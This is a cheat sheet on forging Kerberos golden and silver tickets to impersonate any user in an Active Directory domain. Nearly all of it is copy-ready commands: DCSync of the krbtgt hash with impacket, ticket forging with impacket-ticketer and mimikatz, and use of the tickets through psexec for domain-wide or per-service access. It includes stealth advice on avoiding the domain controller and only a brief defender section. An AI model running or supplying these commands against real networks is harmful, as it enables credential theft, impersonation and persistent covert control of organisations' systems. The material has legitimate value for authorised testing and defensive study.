Golden & Silver Tickets - Cheat Sheet

Forge Kerberos tickets to impersonate anyone, persistently. A GOLDEN ticket is
a forged TGT signed with the krbtgt account's hash - it grants access to the
whole domain as any user. A SILVER ticket is a forged TGS for ONE service,
signed with that service account's hash - stealthier, scoped to one host.
Tools: impacket (ticketer.py), mimikatz. These are persistence/escalation -
you need the relevant hash first.
Replace the placeholders (<...>) with your own values.


=== GOLDEN TICKET (whole domain) ===
Requires the krbtgt NT hash + the domain SID. You get krbtgt from DCSync once
you've reached Domain Admin (so golden = persistence, not initial escalation).

Step G1 - Get the ingredients

    # krbtgt hash via DCSync (needs DA / replication rights)
    impacket-secretsdump <domain>/<da-user>:<password>@<dc-ip> -just-dc-user krbtgt

    # domain SID
    impacket-lookupsid <domain>/<user>:<password>@<dc-ip> | head
    # (the SID is the S-1-5-21-... prefix shared by all domain objects)

Step G2 - Forge the golden TGT (impacket ticketer)

    impacket-ticketer -nthash <krbtgt-nt-hash> -domain-sid <domain-sid> \
        -domain <domain> Administrator

This writes Administrator.ccache - a TGT for "Administrator" (the name can be
anything, even a non-existent user).

Step G3 - Use it

    export KRB5CCNAME=Administrator.ccache
    nxc smb <dc-fqdn> --use-kcache
    impacket-psexec -k -no-pass <domain>/Administrator@<dc-fqdn>
    impacket-secretsdump -k -no-pass <domain>/Administrator@<dc-fqdn>   # DCSync


=== SILVER TICKET (one service, stealthy) ===
Requires the SERVICE account's NT hash (e.g. a machine account's hash for
CIFS, or a service account for MSSQL). No DC contact at all when using it - the
DC never sees the forged TGS, so it's much quieter than golden.

Step S1 - Get the service account hash
    - machine account hash (for CIFS/HOST on that box) from secretsdump/LSASS
    - or a service account NT hash (kerberoast + crack, or dump)

Step S2 - Forge the silver TGS for a target SPN

    impacket-ticketer -nthash <service-nt-hash> -domain-sid <domain-sid> \
        -domain <domain> -spn cifs/<target-fqdn> Administrator

Common SPN classes: cifs (file/psexec), host, http, mssqlsvc/<host>:1433.

Step S3 - Use it (no DC needed)

    export KRB5CCNAME=Administrator.ccache
    impacket-psexec -k -no-pass <domain>/Administrator@<target-fqdn>


=== mimikatz equivalents (on a Windows host) ===

    # Golden
    kerberos::golden /user:Administrator /domain:<domain> /sid:<domain-sid> \
        /krbtgt:<krbtgt-nt-hash> /ptt

    # Silver
    kerberos::golden /user:Administrator /domain:<domain> /sid:<domain-sid> \
        /target:<target-fqdn> /service:cifs /rc4:<service-nt-hash> /ptt
    # /ptt injects the ticket into the current session


Golden vs Silver (when to use which)
  - Golden : full domain, any service, long-lived. Needs krbtgt hash (=you were
             already DA). Best for PERSISTENCE; noisier (DC issues/sees TGT use).
  - Silver : one service on one host. Needs only that service's hash. Stealthy
             (no DC contact). Best for targeted, quiet access.

Defender notes
  - Rotate krbtgt TWICE to invalidate all golden tickets.
  - Forged tickets can have absurd lifetimes (mimikatz default 10y) - a red
    flag; modern detections also catch missing/forged PAC fields.

(optional) Fix clock skew - Kerberos fails on time drift: sudo ntpdate <dc-ip>


Key idea: Kerberos trusts whatever is signed with the right key. Own the krbtgt
hash and you can mint a TGT for anyone (golden) - the keys to the whole domain.
Own a single service account's hash and you can mint a TGS for that service
(silver) without ever talking to the DC. Both are forgery, not cracking - which
is why they're prime persistence and the reason krbtgt rotation matters.
